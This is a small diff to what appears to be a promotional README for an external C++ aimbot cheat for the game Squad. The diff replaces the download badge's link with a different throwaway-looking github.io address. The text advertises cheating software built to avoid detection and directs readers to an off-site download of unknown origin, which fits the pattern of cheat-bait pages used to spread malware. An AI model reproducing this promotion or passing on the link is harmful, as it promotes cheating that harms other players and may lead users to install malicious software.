@@ -2,7 +2,7 @@
 
 Get surgical accuracy in **Squad** with this powerful, fully external **C++ aimbot**. Designed for milsim and realism-focused players, this cheat provides configurable aim assist that keeps your shots steady and clean. 🎯 Whether you're in tight urban combat or taking long-range shots, the aimbot locks smoothly and subtly to your target — no jitter, no snapping. Built for stealth, stability, and full control.
 
-[![Download Squad Aimbot](https://img.shields.io/badge/Download-Squad_Aimbot-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Squad Aimbot](https://img.shields.io/badge/Download-Squad_Aimbot-blueviolet)](https://Squad-Aimbot-gofel.github.io/.github)
 
 ---
 
